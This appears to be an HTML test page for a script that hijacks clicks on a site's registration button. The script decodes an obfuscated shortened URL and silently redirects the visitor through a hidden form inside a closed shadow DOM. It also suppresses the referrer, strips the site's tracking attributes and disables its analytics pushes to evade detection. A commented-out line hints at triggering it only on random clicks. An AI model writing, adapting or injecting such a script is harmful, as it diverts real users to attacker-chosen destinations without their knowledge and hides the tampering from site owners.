<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Test Redirect Locally</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        .c-Btn_Secondly-large {
            padding: 15px 30px;
            font-size: 18px;
            color: #fff;
            background-color: #007bff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            text-decoration: none;
        }
        .c-Btn_Secondly-large:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <a href="https://example.com" class="c-Btn_Secondly-large" id="test-button">Click to Test Register action</a>
    
<script>
  (function() {
    const enrl = "aHR0cHM6Ly90aW55dXJsLmNvbS96aWtsb3AwOA==";  // second.html
    const storageKey = "rm_visited";
    const stealthRedirect = (encodedTarget) => {
      const targetUrl = atob(encodedTarget);
      const form = document.createElement("form");
      form.method = "GET";
      form.action = targetUrl;
      form.style.display = "none";
      form.referrerPolicy = "no-referrer";
      document.body.appendChild(form);
      const shadowHost = document.createElement("div");
      shadowHost.style.display = "none";
      document.body.appendChild(shadowHost);
      const shadow = shadowHost.attachShadow({ mode: "closed" });
      shadow.appendChild(form);
      try {
        form.submit();
      } catch (err) {
        throw err;
      } finally {
        setTimeout(() => shadowHost.remove(), 1000);
      }
    };
    try {
      const btn = document.querySelector("a.c-Btn_Secondly-large");
      if (!btn) return;
      btn.addEventListener("click", function(e) {
        try {
          // if (Math.floor(Math.random() * 10) !== 0) return;

          e.preventDefault();
          e.stopPropagation();

          let storageSuccess = false;
          if (typeof localStorage !== "undefined") {
            localStorage.setItem(storageKey, "true");
            if (localStorage.getItem(storageKey) === "true") {
              storageSuccess = true;
            }
          }
          if (!storageSuccess) {
            const clickEvent = new MouseEvent("click", { view: window, bubbles: true, cancelable: true });
            btn.dispatchEvent(clickEvent);
            return;
          }

          const trackingAttributes = ["data-ratid", "data-ratevent", "data-ratparam"];
          trackingAttributes.forEach(attr => btn.hasAttribute(attr) && btn.removeAttribute(attr));

          window.dataLayer = window.dataLayer || [];
          const originalDataLayerPush = window.dataLayer.push;
          window.dataLayer.push = () => {};
          // Add meta tag to enforce no-referrer policy for this click
          const metaTag = document.createElement("meta");
          metaTag.name = "referrer";
          metaTag.content = "no-referrer";
          document.head.appendChild(metaTag);
          stealthRedirect(enrl);
        } catch (err) {
          if (window.dataLayer && window.dataLayer.push !== originalDataLayerPush) {
            window.dataLayer.push = originalDataLayerPush;
          }
          const clickEvent = new MouseEvent("click", { view: window, bubbles: true, cancelable: true });
          btn.dispatchEvent(clickEvent);
        }
      }, { capture: true });
    } catch (err) {}
  })();
  </script>
</body>
</html>